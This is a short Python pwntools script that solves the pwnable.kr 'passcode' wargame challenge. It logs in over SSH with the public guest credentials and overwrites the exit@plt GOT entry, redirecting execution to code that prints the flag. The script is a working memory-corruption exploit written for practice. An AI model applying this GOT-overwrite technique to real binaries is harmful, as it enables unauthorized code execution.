from pwn import *

# details
HOST = "pwnable.kr"
PORT = 2222
USER = "passcode"
PASSWORD = "guest"

def main():

    offset = b'A'*96
    where_to_write = p32(0x804a018) # addr of exit@plt (for variety :D)
    what_to_write = str(int("0x80485e3", 16)).encode('utf-8') # addr of <login+127> (system("bin/cat flag")) NEEDS TO BE LIKE THIS AND NOT IN p32() CUZ scanf GETS **INTEGER VALUE**

    payload = offset + where_to_write + what_to_write

    s = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
    conn = s.process('./passcode')
    conn.sendline(payload)
    conn.interactive()

if __name__ == '__main__':
    main()
